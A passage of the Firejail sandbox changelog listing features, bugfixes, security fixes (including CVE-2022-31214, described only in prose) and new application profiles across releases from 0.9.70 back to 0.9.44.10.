 -- netblue30 <netblue30@yahoo.com>  Mon, 16 Jan 2023 09:00:00 -0500

firejail (0.9.70) baseline; urgency=low
  * security: CVE-2022-31214 - root escalation in --join logic
    Reported by  Matthias Gerstner, working exploit code was provided to our
    development team. In the same time frame, the problem was independently
    reported by Birk Blechschmidt. Full working exploit code was also provided.
  * feature: enable shell tab completion with --tab (#4936)
  * feature: disable user profiles at compile time (#4990)
  * feature: Allow resolution of .local names with avahi-daemon in the apparmor
    profile (#5088)
  * feature: always log seccomp errors (#5110)
  * feature: firecfg --guide, guided user configuration (#5111)
  * feature: --oom, kernel OutOfMemory-killer (#5122)
  * modif: --ids feature needs to be enabled at compile time (#5155)
  * modif: --nettrace only available to root user
  * rework: whitelist restructuring (#4985)
  * rework: firemon, speed up and lots of fixes
  * bugfix: --private-cwd not expanding macros, broken hyperrogue (#4910)
  * bugfix: nogroups + wrc prints confusing messages (#4930 #4933)
  * bugfix: openSUSE Leap - whitelist-run-common.inc (#4954)
  * bugfix: fix printing in evince (#5011)
  * bugfix: gcov: fix gcov functions always declared as dummy (#5028)
  * bugfix: Stop warning on safe supplementary group clean (#5114)
  * build: remove ultimately unused INSTALL and RANLIB check macros (#5133)
  * build: mkdeb.sh.in: pass remaining arguments to ./configure (#5154)
  * ci: replace centos (EOL) with almalinux (#4912)
  * ci: fix --version not printing compile-time features (#5147)
  * ci: print version after install & fix apparmor support on build_apparmor
    (#5148)
  * docs: Refer to firejail.config in configuration files (#4916)
  * docs: firejail.config: add warning about allow-tray (#4946)
  * docs: mention that the protocol command accumulates (#5043)
  * docs: mention inconsistent homedir bug involving --private=dir (#5052)
  * docs: mention capabilities(7) on --caps (#5078)
  * new profiles: onionshare, onionshare-cli, opera-developer, songrec
  * new profiles: node-gyp, npx, semver, ping-hardened
  * removed profiles: nvm
 -- netblue30 <netblue30@yahoo.com>  Mon, 7 Feb 2022 09:00:00 -0500

firejail (0.9.68) baseline; urgency=low
  * security: on Ubuntu, the PPA is now recommended over the distro package
    (see README.md) (#4748)
  * security: bugfix: private-cwd leaks access to the entire filesystem
    (#4780); reported by Hugo Osvaldo Barrera
  * feature: remove (some) environment variables with auth-tokens (#4157)
  * feature: ALLOW_TRAY condition (#4510 #4599)
  * feature: add basic Firejail support to AppArmor base abstraction (#3226
    #4628)
  * feature: intrusion detection system (--ids-init, --ids-check)
  * feature: deterministic shutdown command (--deterministic-exit-code,
     --deterministic-shutdown) (#928 #3042 #4635)
  * feature: noprinters command (#4607 #4827)
  * feature: network monitor (--nettrace)
  * feature: network locker (--netlock) (#4848)
  * feature: whitelist-ro profile command (#4740)
  * feature: disable pipewire with --nosound (#4855)
  * feature: Unset TMP if it doesn't exist inside of sandbox (#4151)
  * feature: Allow apostrophe in whitelist and blacklist (#4614)
  * feature: AppImage support in --build command (#4878)
  * modifs: exit code: distinguish fatal signals by adding 128 (#4533)
  * modifs: firecfg.config is now installed to /etc/firejail/ (#408 #4669)
  * modifs: close file descriptors greater than 2 (--keep-fd) (#4845)
  * modifs: nogroups now stopped causing certain system groups to be dropped,
    which are now controlled by the relevant "no" options instead (such as
    nosound -> drop audio group), which fixes device access issues on systems
    not using (e)logind (such as with seatd) (#4632 #4725 #4732 #4851)
  * removal: --disable-whitelist at compile time
  * removal: whitelist=yes/no in /etc/firejail/firejail.config
  * bugfix: Fix sndio support (#4362 #4365)
  * bugfix: Error mounting tmpfs (MS_REMOUNT flag not being cleared) (#4387)
  * bugfix: --build clears the environment (#4460 #4467)
  * bugfix: firejail hangs with net parameter (#3958 #4476)
  * bugfix: Firejail does not work with a custom hosts file (#2758 #4560)
  * bugfix: --tracelog and --trace override /etc/ld.so.preload (#4558 #4586)
  * bugfix: PATH_MAX is undeclared on musl libc (#4578 #4579 #4583 #4606)
  * bugfix: firejail symlinks are not skipped with private-bin + globs (#4626)
  * bugfix: Firejail rejects empty arguments (#4395)
  * bugfix: firecfg does not work with symlinks (discord.desktop) (#4235)
  * bugfix: Seccomp list output goes to stdout instead of stderr (#4328)
  * bugfix: private-etc does not work with symlinks (#4887)
  * bugfix: Hardware key not detected on keepassxc (#4883)
  * build: allow building with address sanitizer (#4594)
  * build: Stop linking pthread (#4695)
  * build: Configure cleanup and improvements (#4712)
  * ci: add profile checks for sorting disable-programs.inc and
    firecfg.config and for the required arguments in private-etc (#2739 #4643)
  * ci: pin GitHub actions to SHAs and use Dependabot to update them (#4774)
  * docs: Add new command checklist to CONTRIBUTING.md (#4413)
  * docs: Rework bug report issue template and add both a question and a
    feature request template (#4479 #4515 #4561)
  * docs: fix contradictory descriptions of machine-id ("preserves" vs
    "spoofs") (#4689)
  * docs: Document that private-bin and private-etc always accumulate (#4078)
  * new includes: whitelist-run-common.inc (#4288), disable-X11.inc (#4462)
  * new includes: disable-proc.inc (#4521)
  * removed includes: disable-passwordmgr.inc (#4454 #4461)
  * new profiles: microsoft-edge-beta, clion-eap, lifeograph, zim
  * new profiles: io.github.lainsce.Notejot, rednotebook, gallery-dl
  * new profiles: yt-dlp, goldendict, goldendict, bundle, cmake
  * new profiles: make, meson, pip, codium, telnet, ftp, OpenStego
  * new profiles: imv, retroarch, torbrowser, CachyBrowser,
  * new profiles: notable, RPCS3, wget2, raincat, conitop, 1passwd,
  * new profiles: Seafile, neovim, com.github.tchx84.Flatseal
 -- netblue30 <netblue30@yahoo.com>  Sun, 6 Feb 2022 09:00:00 -0500

firejail (0.9.66) baseline; urgency=low
  * deprecated --audit options, relpaced by jailcheck utility
  * deprecated follow-symlink-as-user from firejail.config
  * new firejail.config settings: private-bin, private-etc
  * new firejail.config settings: private-opt, private-srv
  * new firejail.config settings: whitelist-disable-topdir
  * new firejail.config settings: seccomp-filter-add
  * removed kcmp syscall from seccomp default filter
  * rename --noautopulse to keep-config-pulse
  * filtering environment variables
  * zsh completion
  * command line: --mkdir, --mkfile
  * --protocol now accumulates
  * Jolla/SailfishOS patches
  * private-lib rework
  * whitelist rework
  * jailtest utility for testing running sandboxes
  * capabilities list update
  * faccessat2 syscall support
  * --private-dev keeps /dev/input
  * added --noinput to disable /dev/input
  * add support for subdirs in --private-etc
  * compile time: --enable-force-nonewprivs
  * compile time: --disable-output
  * compile time: --enable-lts
  * subdirs support in private-etc
  * input devices support in private-dev, --no-input
  * support trailing comments on profile lines
  * new profiles: vmware-view, display-im6.q16, ipcalc, ipcalc-ng
  * ebook-convert, ebook-edit, ebook-meta, ebook-polish, lzop,
  * avidemux, calligragemini, vmware-player, vmware-workstation
  * gget, com.github.phase1geo.minder, nextcloud-desktop, pcsxr
  * PPSSPPSDL, openmw, openmw-launcher, jami-gnome, PCSX2, sum
  * bcompare, b2sum, cksum, md5sum, sha1sum, sha224sum, sha256sum
  * sha384sum, sha512sum, librewold-nightly, Quodlibet, tmux, sway
  * alienarena, alienarena-wrapper, ballbuster, ballbuster-wrapper,
  * colorful, colorful-wrapper, gl-117, gl-117-wrapper, glaxium,
  * glaxium-wrapper, pinball, pinball-wrapper, etr-wrapper, firedragon
  * neverball-wrapper, neverputt-wrapper, supertuxkart-wrapper, neochat,
  * cargo, LibreCAD, blobby, funnyboat, pipe-viewer, gtk-pipe-viewer
  * links2, xlinks2, googler, ddgr, tin
 -- netblue30   Mon, 28 Jun 2021 09:00:00 -0500

firejail (0.9.64.4) baseline; urgency=low
  * disabled overlayfs, pending multiple fixes
 -- netblue30   Sun, 7 Feb 2021 09:00:00 -0500

firejail (0.9.64.2) baseline; urgency=low
  * allow --tmpfs inside $HOME for unprivileged users
  * --disable-usertmpfs  compile time option
  * allow AF_BLUETOOTH via --protocol=bluetooth
  * Setup guide for new users: contrib/firejail-welcome.sh
  * implement netns in profiles
  * added nolocal6.net IPv6 network filter
  * new profiles: spectacle, chromium-browser-privacy, gtk-straw-viewer
  * new profiles: gtk-youtube-viewer, gtk2-youtube-viewer, gtk3-youtube-viewer
  * new profiles: straw-viewer, lutris, dolphin-emu, authenticator-rs, servo
  * new profiles: npm, marker, yarn, lsar, unar, agetpkg, mdr, shotwell, qnapi
  * new profiles: guvcview, pkglog, kdiff3, CoyIM
 -- netblue30   Tue, 26 Jan 2021 09:00:00 -0500

firejail (0.9.64) baseline; urgency=low
  * replaced --nowrap option with --wrap in firemon
  * The blocking action of seccomp filters has been changed from
    killing the process to returning EPERM to the caller. To get the
    previous behaviour, use --seccomp-error-action=kill or
    syscall:kill syntax when constructing filters, or override in
    /etc/firejail/firejail.config file.
  * Fine-grained D-Bus sandboxing with xdg-dbus-proxy.
    xdg-dbus-proxy must be installed, if not D-Bus access will be allowed.
    With this version nodbus is deprecated, in favor of dbus-user none and
    dbus-system none and will be removed in a future version.
  * DHCP client support
  * firecfg only fix dektop-files if started with sudo
  * SELinux labeling support
  * custom 32-bit seccomp filter support
  * restrict ${RUNUSER} in several profiles
  * blacklist shells such as bash in several profiles
  * whitelist globbing
  * mkdir and mkfile support for /run/user directory
  * support ignore for include
  * --include on the command line
  * splitting up media players whitelists in whitelist-players.inc
  * new condition: HAS_NOSOUND
  * new profiles: gfeeds, firefox-x11, tvbrowser, rtv, clipgrab, muraster
  * new profiles: gnome-passwordsafe, bibtex, gummi, latex, mupdf-x11-curl
  * new profiles: pdflatex, tex, wpp, wpspdf, wps, et, multimc, mupdf-x11
  * new profiles: gnome-hexgl, com.github.johnfactotum.Foliate, mupdf-gl, mutool
  * new profiles: desktopeditors, impressive, planmaker18, planmaker18free
  * new profiles: presentations18, presentations18free, textmaker18, teams
  * new profiles: textmaker18free, xournal, gnome-screenshot, ripperX
  * new profiles: sound-juicer, com.github.dahenson.agenda, gnome-pomodoro
  * new profiles: gnome-todo, x2goclient, iagno, kmplayer, penguin-command
  * new profiles: frogatto, gnome-mines, gnome-nibbles, lightsoff, warmux
  * new profiles: ts3client_runscript.sh, ferdi, abiword, four-in-a-row
  * new profiles: gnome-mahjongg, gnome-robots, gnome-sudoku, gnome-taquin
  * new profiles: gnome-tetravex, blobwars, gravity-beams-and-evaporating-stars
  * new profiles: hyperrogue, jumpnbump-menu, jumpnbump, magicor, mindless
  * new profiles: mirrormagic, mrrescue, scorched3d-wrapper, scorchwentbonkers
  * new profiles: seahorse-adventures, wordwarvi, xbill, gnome-klotski
  * new profiles: swell-foop, fdns, five-or-more, steam-runtime
  * new profiles: nicotine, plv, mocp, apostrophe, quadrapassel, dino-im
  * new profiles: hitori, bijiben, gnote, gnubik, ZeGrapher, xonotic-sdl-wrapper
  * new profiles: gapplication, openarena_ded, element-desktop, cawbird
  * new profiles: freetube, strawberry, jitsi-meet-desktop
  * new profiles: homebank, mattermost-desktop, newsflash, com.gitlab.newsflash
  * new profiles: sushi, xfce4-screenshooter, org.gnome.NautilusPreviewer, lyx
  * new profiles: minitube, nuclear, mtpaint, minecraft-launcher, gnome-calendar
  * new profiles: vmware, git-cola, otter-browser, kazam, menulibre, musictube
  * new profiles: onboard, fractal, mirage, quaternion, spectral, man, psi
  * new profiles: smuxi-frontend-gnome, balsa, kube, trojita, youtube
  * new profiles: youtubemusic-nativefier, cola, dbus-send, notify-send
  * new profiles: qrencode, ytmdesktop, twitch
  * new profiles: xournalpp, chromium-freeworld, equalx
 -- netblue30   Wed, 21 Oct 2020 08:00:00 -0500

firejail (0.9.62.4) baseline; urgency=low
  * fix AppArmor broken in the previous release
  * miscellaneous fixes
 -- netblue30   Mon, 17 Aug 2020 08:00:00 -0500

firejail (0.9.62.2) baseline; urgency=low
  * patches from Debian (firejail 0.9.62-3, sid):
         profile-fixes.patch, apparmor-include.patch
  * patches from Debian (firejail 0.9.64-4, sid)
         CVE-2020-17367 reported by Tim Starling
         CVE-2020-17368 reported by Tim Starling
  * patches from Debian (firejail 0.9.64-4, sid)
         element-profile.patch,  usrsharedoc.patch,
         pathnames.patch, usr-share-firefox.patch
  * additional hardening and bug fixes
 -- netblue30   Mon, 10 Aug 2020 08:00:00 -0500

firejail (0.9.62) baseline; urgency=low
  * added file-copy-limit in /etc/firejail/firejail.config
  * profile templates (/usr/share/doc/firejail)
  * allow-debuggers support in profiles
  * several seccomp enhancements
  * compiler flags autodetection
  * move chroot entirely from path based to file descriptor based mounts
  * whitelisting /usr/share in a large number of profiles
  * new scripts in contrib: gdb-firejail.sh and sort.py
  * enhancement: whitelist /usr/share in some profiles
  * added signal mediation to apparmor profile
  * new conditions: HAS_X11, HAS_NET
  * new profiles: qgis, klatexformula, klatexformula_cmdl, links, xlinks
  * new profiles: pandoc, teams-for-linux, OpenArena, gnome-sound-recorder
  * new profiles: godot, tcpdump, tshark, newsbeuter, keepassxc-cli
  * new profiles: keepassxc-proxy, rhythmbox-client, jerry, zeal, mpg123
  * new profiles: conplay, mpg123.bin, mpg123-alsa, mpg123-id3dump, out123
  * new profiles: mpg123-jack, mpg123-nas, mpg123-openal, mpg123-oss
  * new profiles: mpg123-portaudio, mpg123-pulse, mpg123-strip, pavucontrol-qt
  * new profiles: gnome-characters, gnome-character-map, rsync, Whalebird,
  * new profiles: tor-browser (AUR), Zulip, tb-starter-wrapper, bzcat,
  * new profiles: kiwix-desktop, bzcat, zstd, pzstd, zstdcat, zstdgrep, zstdless
  * new profiles: zstdmt, unzstd, i2p, ar, gnome-latex, pngquant, kalgebra
  * new profiles: kalgebramobile, signal-cli, amuled, kfind, profanity
  * new profiles: audio-recorder, cameramonitor, ddgtk, drawio, unf, gmpc
  * new profiles: electron-mail, gist, gist-paste
 -- netblue30   Sat, 28 Dec 2019 08:00:00 -0500

firejail (0.9.60) baseline; urgency=low
  * security bug reported by Austin Morton:
    Seccomp filters are copied into /run/firejail/mnt, and are writable
    within the jail. A malicious process can modify files from inside the
    jail. Processes that are later joined to the jail will not have seccomp
    filters applied.
  * memory-deny-write-execute now also blocks memfd_create
  * add private-cwd option to control working directory within jail
  * blocking system D-Bus socket with --nodbus
  * bringing back Centos 6 support
  * drop support for flatpak/snap packages
  * new profiles: crow, nyx, mypaint, celluoid, nano, transgui, mpdris2
  * new profiles: sysprof, simplescreenrecorder, geekbench, xfce4-mixer
  * new profiles: pavucontrol, d-feet, seahorse, secret-tool, gnome-keyring
  * new profiles: regextester, hardinfo, gnome-system-log, gnome-nettool
  * new profiles: netactview, redshift, devhelp, assogiate, subdownloader
  * new profiles: font-manager, exfalso, gconf-editor, dconf-editor
  * new profiles: sysprof-cli, seahorse-tool, secret-tool, dconf, gsettings
  * new profiles: code-oss, pragha, Maelstrom, ostrichriders, bzflag
  * new profiles: freeciv, lincity-ng, megaglest, openttd, crawl, crawl-tiles
  * new profiles: teeworlds, torcs, tremulous, warsow, lugaru, manaplus
  * new profiles: pioneer, scorched3d, widelands, freemind, kid3, kid3-qt
  * new profiles: kid3-cli, nomacs, freecol, opencity, openclonk, slashem
  * new profiles: vultureseye, vulturesclaw, anki, cheese, utox, mp3splt
  * new profiles: oggsplt, flacsplt, gramps, newsboat, freeoffice-planmaker
  * new profiles: autokey-gtk, autokey-qt, autokey-run, autokey-shell
  * new profiles: freeoffice-presentations, freeoffice-textmaker, mp3wrap
  * new profiles: inkview, meteo-qt, mp3splt-gtk, ktouch, yelp, cantata
 -- netblue30   Sun, 26 May 2019 08:00:00 -0500

firetools (0.9.58) baseline; urgency=low
  * split network interface stats in a separate window
  * detect --net=none in network interface stats
  * support for Firejail LTS versions
  * bugfixes
 -- netblue30   Thu, 24 Jan 2019 08:00:00 -0500

firejail (0.9.56-LTS) baseline; urgency=low
  * code based on Firejail version 0.9.56
  * much smaller code base for SUID executable
  * command line options removed:
     --audit, --build, --cgroup, --chroot, --get, --ls, --output,
     --output-stderr, --overlay, --overlay-named, --overlay-tmpfs,
     --overlay-clean, --private-home, --private-bin, --private-etc,
     --private-opt, --private-srv, --put, --rlimit*, --trace, --tracelog,
     --x11*, --xephyr*
  * compile-time options: --enable-apparmor, --disable-seccomp,
     --disable-globalcfg, --disable-network, --disable-userns,
     --disable-whitelist, --disable-suid, --enable-fatal-warnings,
     --enable-busybox-workaround
 -- netblue30   Sun, 21 Oct 2018 08:00:00 -0500

firejail (0.9.58.2) baseline; urgency=low
  * cgroup flag in /etc/firejail/firejail.config file
  * name-change flag in /etc/firejail.config file
  * --name rework
  * new profiles: klavaro, vscodium
  * browser profiles fixes
  * various other bugfixes
 -- netblue30   Fri, 8 Feb 2019 08:00:00 -0500

firejail (0.9.58) baseline; urgency=low
  * --disable-mnt rework
  * --net.print command
  * GitLab CI/CD integration: disto specific builds
  * profile parser enhancements and conditional handling support
     for HAS_APPIMAGE, HAS_NODBUS, BROWSER_DISABLE_U2F
  * profile name support
  * added explicit nonewprivs support to join option
  * new profiles: QMediathekView, aria2c, Authenticator, checkbashisms
  * new profiles: devilspie, devilspie2, easystroke, github-desktop, min
  * new profiles: bsdcat, bsdcpio, bsdtar, lzmadec, lbunzip2, lbzcat
  * new profiles: lbzip2, lzcat, lzcmp, lzdiff, lzegrep, lzfgrep, lzgrep
  * new profiles: lzless, lzma, lzmainfo, lzmore, unlzma, unxz, xzcat
  * new profiles: xzcmp, xzdiff, xzegrep, xzfgrep, xzgrep, xzless, xzmore
  * new profiles: lzip, artha, nitroshare, nitroshare-cli, nitroshare-nmh
  * new profiles: nirtoshare-send, nitroshare-ui, mencoder, gnome-pie
  * new profiles: masterpdfeditor, QOwnNotes, aisleriot, Mendeley
  * new profiles: feedreader, ocenaudio, mpsyt, thunderbird-wayland
  * new profiles: supertuxkart, ghostwriter, gajim-history-manager
  * bugfixes
 -- netblue30   Sat, 26 Jan 2019 08:00:00 -0500

firejail (0.9.56) baseline; urgency=low
  * modif: removed CFG_CHROOT_DESKTOP configuration option
  * modif: removed compile time --enable-network=restricted
  * modif: removed compile time --disable-bind
  * modif: --net=none allowed even if networking was disabled at compile
     time or at run time
  * modif: allow system users to run the sandbox
  * support wireless devices in --net option
  * support tap devices in --net option (tunneling support)
  * allow IP address configuration if the parent interface specified
     by --net is not configured (--netmask)
  * support for firetunnel utility
  * disable U2F devices (--nou2f)
  * add --private-cache to support private ~/.cache
  * support full paths in private-lib
  * globbing support in private-lib
  * support for local user directories in firecfg (--bindir)
  * new profiles: ms-excel, ms-office, ms-onenote, ms-outlook, ms-powerpoint,
  * new profiles: ms-skype, ms-word, riot-desktop, gnome-mpv, snox, gradio,
  * new profiles: standardnotes-desktop, shellcheck, patch, flameshot,
  * new profiles: rview, rvim, vimcat, vimdiff, vimpager, vimtutor, xxd,
  * new profiles: Beaker, electrum, clamtk, pybitmessage, dig, whois,
  * new profiles: jdownloader, Fluxbox, Blackbox, Awesome, i3
  * new profiles: start-tor-browser.desktop
 -- netblue30   Tue, 18 Sep 2018 08:00:00 -0500

firetools (0.9.52) baseline; urgency=low
  * modif: moving to a grayscale color scheme
  * feature: firewall support in stats window
  * feature: AppArmor support in stats window
  * feature: adding Signal to the default list of applications
  * bugfixes and various user interface improvements
 -- netblue30   Thu, 1 Mar 2018 13:00:00 -0500

firejail (0.9.54) baseline; urgency=low
  * modif: --force removed
  * modif: --csh, --zsh removed
  * modif: --debug-check-filename removed
  * modif: --git-install and --git-uninstall removed
  * modif: support for private-bin, private-lib and shell none has been
     disabled while running AppImage archives in order to be able to use
     our regular profile files with AppImages.
  * modif: restrictions for /proc, /sys and /run/user directories
     are moved from AppArmor profile into firejail executable
  * modif: unifying Chromium and Firefox browsers profiles.
     All users of Firefox-based browsers who use addons and plugins
     that read/write from ${HOME} will need to uncomment the includes for
     firefox-common-addons.inc in firefox-common.profile.
  * modif: split disable-devel.inc into disable-devel and
     disable-interpreters.inc
  * Firejail user access database (/etc/firejail/firejail.users,
     man firejail-users)
  * add --noautopulse to disable automatic ~/.config/pulse (for complex setups)
  * Spectre mitigation patch for gcc and clang compiler
  * D-Bus handling (--nodbus)
  * AppArmor support for overlayfs and chroot sandboxes
  * AppArmor support for AppImages
  * Enable AppArmor by default for a large number of programs
  * firejail --apparmor.print option
  * firemon --apparmor option
  * apparmor yes/no flag in /etc/firejail/firejail.config
  * seccomp syscall list update for glibc 2.26-10
  * seccomp disassembler for --seccomp.print option
  * seccomp machine code optimizer for default seccomp filters
  * IPv6 DNS support
  * whitelist support for overlay and chroot sandboxes
  * private-dev support for overlay and chroot sandboxes
  * private-tmp support for overlay and chroot sandboxes
  * added sandbox name support in firemon
  * firemon/prctl enhancements
  * noblacklist support for /sys/module directory
  * whitelist support for /sys/module directory
  * new profiles: basilisk, Tor Browser language packs, PlayOnLinux, sylpheed,
  * new profiles: discord-canary, pycharm-community, pycharm-professional,
  * new profiles: pdfchain, tilp, vivaldi-snapshot, bitcoin-qt, kaffeine,
  * new profiles: falkon, gnome-builder, asunder, VS Code, gnome-recipes,
  * new profiles: akonadi_controle, evince-previewer, evince-thumbnailer,
  * new profiles: blender-2.8, thunderbird-beta, ncdu, gnome-logs, gcloud,
  * new profiles: musixmatch, gunzip, bunzip2, enchant-lsmod, enchant-lsmod-2,
  * new profiles: enchant, enchant-2, Discord, acat, adiff, als, apack,
  * new profiles: arepack, aunpack profiles, ppsspp, scallion, clion,
  * new profiles: baloo_filemetadata_temp_extractor, AnyDesk, webstorm, xmind,
  * new profiles: qmmp, sayonara
 -- netblue30   Wed, 16 May 2018 08:00:00 -0500

firejail (0.9.52) baseline; urgency=low
  * modif: --allow-private-blacklists was deprecated; blacklisting,
    read-only, read-write, tmpfs and noexec are allowed in
    private home directories
  * modif: remount-proc-sys deprecated from firejail.config
  * modif: follow-symlink-private-bin deprecated from firejail.config
  * modif: --profile-path was deprecated
  * enhancement: support Firejail user config directory in firecfg
  * enhancement: disable DBus activation in firecfg
  * enhancement; enumerate root directories in apparmor profile
  * enhancement: /etc and /usr/share whitelisting support
  * enhancement: globbing support for --private-bin
  * feature: systemd-resolved integration
  * feature: whitelisting /var directory in most profiles
  * feature: GTK2, GTK3 and Qt4 private-lib support
  * feature: --debug-private-lib
  * feature: test deployment of private-lib for the following
    applications: evince, galculator, gnome-calculator,
    leafpad, mousepad, transmission-gtk, xcalc, xmr-stak-cpu,
    atril, mate-color-select, tar, file, strings, gpicview,
    eom, eog, gedit, pluma
  * feature: --writable-run-user
  * feature: --rlimit-as
  * feature: --rlimit-cpu
  * feature: --timeout
  * feature: profile build tool (--build)
  * feature: --netfilter.print
  * feature: --netfilter6.print
  * feature: netfilter template support
  * new profiles: upstreamed many profiles from the following sources:
     https://github.com/chiraag-nataraj/firejail-profiles,
     https://github.com/nyancat18/fe,
     https://aur.archlinux.org/packages/firejail-profiles.
  * new profiles: terasology, surf, rocketchat, clamscan, clamdscan,
      clamdtop, freshclam, xmr-stak-cpu, amule, ardour4, ardour5,
      brackets, calligra, calligraauthor, calligraconverter, calligraflow,
      calligraplan, calligraplanwork, calligrasheets, calligrastage,
      calligrawords, cin, dooble, dooble-qt4, fetchmail, freecad, freecadcmd,
      google-earth,imagej, karbon, kdenlive, krita, linphone, lmms, macrofusion,
      mpd, natron, Natron, ricochet, shotcut, teamspeak3, tor, tor-browser-en,
      Viber, x-terminal-emulator, zart, conky, arch-audit, ffmpeg, bluefish,
      cinelerra, openshot-qt, pinta, uefitool, aosp, pdfmod, gnome-ring,
      xcalc, zaproxy, kopete, cliqz, signal-desktop, kget, nheko, Enpass,
      kwin_x11, krunner, ping, bsdtar, makepkg (Arch), archaudit-report
      cower (Arch), kdeinit4
 -- netblue30   Thu, 7 Dec 2017 08:00:00 -0500

firetools (0.9.50) baseline; urgency=low
  * modif: removed the periodic window update for seccomp, caps,
     and dns
  * feature: memory deny exec stats support
  * feature: print security profile name in stats window
  * feature: protocol support in firejail-ui
  * feature: nodvd support in firejail-ui
  * feature: novideo support in firejail-ui
  * feature: notv support in firejail-ui
  * enhancement: save window size for fmgr and fstats upon exit
     and restore it next time the program is started
  * enhancement: updated default application list
  * enhancement: rework icon search for firetools launcher
  * enhancement: --enable-fatal-warnings compile configuration
  * Travis CI integration
  * bugfixes
 -- netblue30   Sat, 30 Sep 2017 08:00:00 -0500

firejail (0.9.50) baseline; urgency=low
  * modif: --output split in two commands, --output and --output-stderr
  * feature: per-profile disable-mnt (--disable-mnt)
  * feature: per-profile support to set X11 Xephyr screen size (--xephyr-screen)
  * feature: private /lib directory (--private-lib)
  * feature: disable CDROM/DVD drive (--nodvd)
  * feature: disable DVB devices (--notv)
  * feature: --profile.print
  * enhancement: print all seccomp filters under --debug
  * enhancement: /proc/sys mounting
  * enhancement: rework IP address assingment for --net options
  * enhancement: support for newer Xpra versions (2.1+) -
     set xpra-attach yes in /etc/firejail/firejail.config
  * enhancement: all profiles use a standard layout style
  * enhancement: create /usr/local for firecfg if the directory doesn't exist
  * enhancement: allow full paths in --private-bin
  * seccomp feature: --memory-deny-write-execute
  * seccomp feature: seccomp post-exec
  * seccomp feature: block secondary architecture (--seccomp.block_secondary)
  * seccomp feature: seccomp syscall groups
  * seccomp enhancement: print all seccomp filters under --debug
  * seccomp enhancement: default seccomp list update
  * new profiles: curl, mplayer2, SMPlayer, Calibre, ebook-viewer, KWrite,
  * new profiles: Geary, Liferea, peek, silentarmy, IntelliJ IDEA,
  * new profiles: Android Studio, electron, riot-web, Extreme Tux Racer,
  * new profiles: Frozen Bubble, Open Invaders, Pingus, Simutrans, SuperTux
  * new profiles: telegram-desktop, arm, rambox, apktool, baobab, dex2jar, gitg,
  * new profiles: hashcat, obs, picard, remmina, sdat2img, soundconverter
  * new profiles: truecraft, gnome-twitch, tuxguitar, musescore, neverball
  * new profiles: sqlitebrowse, Yandex Browser, minetest
  * bugfixes
 -- netblue30   Thu, 7 Sep 2017 08:00:00 -0500

firejail (0.9.48) baseline; urgency=low
  * modifs: whitelisted Transmission, Deluge, qBitTorrent, KTorrent;
    please use ~/Downloads directory for saving files
  * modifs: AppArmor made optional; a warning is printed on the screen
    if the sandbox fails to load the AppArmor profile
  * feature: --novideo
  * feature: drop discretionary access control capabilities for
    root sandboxes
  * feature: added /etc/firejail/globals.local for global customizations
  * feature: profile support in overlayfs mode
  * new profiles: vym, darktable, Waterfox, digiKam, Catfish, HandBrake
  * bugfixes
 -- netblue30   Mon, 12 Jun 2017 08:00:00 -0500

firejail (0.9.46) baseline; urgency=low
  * security: split most of networking code in a separate executable
  * security: split seccomp filter code configuration in a separate executable
  * security: split file copying in private option in a separate executable
  * feature: disable gnupg and systemd directories under /run/user
  * feature: test coverage (gcov) support
  * feature: allow root user access to /dev/shm (--noblacklist=/dev/shm)
  * feature: private /opt directory (--private-opt, profile support)
  * feature: private /srv directory (--private-srv, profile support)
  * feature: spoof machine-id (--machine-id, profile support)
  * feature: allow blacklists under --private (--allow-private-blacklist,
    profile support)
  * feature: user-defined /etc/hosts file (--hosts-file, profile support)
  * feature: support for the real /var/log directory (--writable-var-log,
    profile support)
  * feature: config support for firejail prompt in terminals
  * feature: AppImage type 2 support
  * feature: pass command line arguments to appimages
  * feature: allow non-seccomp setup for OverlayFS sandboxes - more work to come
  * feature: added a number of Python scripts for handling sandboxes
  * feature: allow local customization using .local files under /etc/firejail
  * feature: follow-symlink-as-user runtime config option in
    /etc/firejail/firejail.config
  * feature: follow-symlink-private-bin option in /etc/firejail/firejail.config
  * feature: xvfb X11 server support (--x11=xvfb)
  * feature: allow /tmp directory in mkdir and mkfile profile commands
  * feature: implemented --noblacklist command, profile support
  * feature: config support to disable access to /mnt and /media (disable-mnt)
  * feature: config support to disable join (join)
  * feature: disabled Go, Rust, and OpenSSL in disable-devel.conf
  * feature: support overlay, overlay-named and overlay-tmpfs in profile files
  * feature: allow PulseAudio sockets in --private-tmp
  * feature: --fix-sound support in firecfg
  * feature: added support for sandboxing Xpra, Xvfb and Xephyr in
    independent sandboxes when started with firejail --x11
  * feature: enable automatic X server sandboxing for --x11=xpra
    and --x11=xephyr
  * feature: support for Xpra extra params in firejail config file
  * new profiles: xiphos, Tor Browser Bundle, display (imagemagick), Wire,
  * new profiles: mumble, zoom, Guayadeque, qemu, keypass2, xed, pluma,
  * new profiles: Cryptocat, Bless, Gnome 2048, Gnome Calculator,
  * new profiles: Gnome Contacts, JD-GUI, Lollypop, MultiMC5, PDFSam, Pithos,
  * new profiles: Xonotic, wireshark, keepassx2, QupZilla, FossaMail,
  * new profiles: Uzbl browser, iridium browser, Thunar, Geeqie, Engrampa,
  * new profiles: Scribus, mousepad, gpicview, keepassxc, cvlc, MediathekView,
  * new profiles: baloo_file, Nylas, dino, BibleTime, viewnior, Kodi, viking,
  * new profiles: youtube-dl, meld, Arduino, Akregator, KCalc, KTorrent,
  * new profiles: Orage Globaltime, Orage Clendar, xfce4-notes, xfce4-dict,
  * new profiles: Ristretto, PCManFM, Dia, FontForge, Geany, Hugin,
  * new profiles: mate-calc, mate-dictionary, mate-color-select, caja,
  * new profiles: galculator, Nemo, gnome-font-viewer, gucharmap, knotes
  * new profiles: clipit, leafpad, lximage-qt, lxmusic, qlipper, Xvfb, Xephyr
  * new profiles: Blender, 2048-qt
  * bugfixes
 -- netblue30   Sun, 14 May 2017 08:00:00 -0500

firejail (0.9.44.10) baseline; urgency=low
  * security: when using --x11=xorg and --net, incorrect processing of
    the return code of /usr/bin/xauth could end up in starting the
    sandbox without X11 security extension installed. Problem found/fixed
    by Zack Weinberg
  * bugfix: ~/.pki directory whitelisted and later blacklisted. This affects
    most browsers, and disables the custom certificates installed by the user
  * bugfix: firecfg config fix
  * bugfix: gajim security profile fix
  * bugfix: man page fix
  * bugfix: force-nonewprivs fix for /etc/firejail/firejail.config
  * bugfix: xephyr-extra-params fix for /etc/firejail/firejail.config
  * bugfix: memory corruption in noblacklist processing
  * bugfix: --quiet fix for Arch and Fedora systems
  * bugfix: updated Keepass(x) profiles
  * bugfix: firemon --nowrap problem
  * bugfix: document firemon --nowrap in man page and in --help option
  * bugfix: bash completion for --noblacklist command
  * bugfix: vlc profile fix
  * bugfix: fixed handling of .local profile files when the software is
